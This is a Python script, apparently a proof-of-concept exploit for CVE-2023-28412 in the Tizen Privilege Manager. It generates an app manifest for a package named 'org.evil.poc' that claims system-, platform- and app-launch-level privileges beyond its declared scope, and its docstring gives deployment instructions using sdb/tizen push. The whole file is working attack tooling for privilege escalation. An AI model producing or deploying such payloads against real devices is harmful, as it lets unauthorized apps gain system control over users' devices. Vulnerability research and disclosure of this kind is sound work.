#!/usr/bin/env python3
"""CVE-2023-28412 — Tizen Privilege Manager. Crafted privilege manifest that
grants beyond the app's declared scope. Deploy with sdb/tizen push."""
import sys
from pathlib import Path

def build() -> bytes:
    # app manifest fragment: declares platform-level privs it shouldn't hold
    return (b'<?xml version="1.0" encoding="UTF-8"?>\n'
            b'<manifest xmlns="http://tizen.org/ns/packages" '
            b'package="org.evil.poc" version="1.0.0">\n'
            b'  <privileges>\n'
            b'    <privilege>http://tizen.org/privilege/appmanager.launch</privilege>\n'
            b'    <privilege>http://tizen.org/privilege/system</privilege>\n'
            b'    <privilege>http://tizen.org/privilege/platform</privilege>\n'
            b'  </privileges>\n'
            b'</manifest>\n')

def main():
    out = Path(sys.argv[1] if len(sys.argv) > 1 else "cve-2023-28412_manifest.xml")
    d = build(); out.write_bytes(d)
    print(f"[+] CVE-2023-28412 manifest -> {out}")

if __name__ == "__main__":
    main()
